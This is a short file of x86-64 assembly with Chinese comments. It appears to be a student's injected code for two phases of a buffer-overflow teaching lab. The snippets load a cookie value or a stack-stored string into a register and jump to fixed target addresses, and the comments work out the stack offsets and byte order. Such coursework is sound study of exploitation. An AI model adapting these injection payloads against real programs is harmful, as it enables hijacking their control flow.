#这个是第二个实验中的汇编
movl $0x59b997fa,%edi
movq $0x4017ec,%rax
jmp *%rax

#这个是第三个实验中的汇编
#0x59b997fa 是要等于的cookie sval的地址0x7ffff7dd18e0 但是这个地址很可能其他程序会用，所用就不用这个地址了，自己重新定义地址吧
movq $0x5561dc70,%rdi  #0x5561dc78-0x8=0x5561dc70 需要减8，因为fs:0x28，正好覆盖了gets的那最初8字节，因此需要78-8
#movq $0x3539623939376661,%rcx 要注意顺序 小端和gdb x/2w的映射关系
movq $0x6166373939623935,%rcx
movq %rcx,(%rdi)   #这样能赋值成功，可见赋值是否成功与在不在栈帧上似乎没有关系，因为此时rsp是0x5561dc78
movq $0x4018fa,%rax #跳到phase3
jmp *%rax
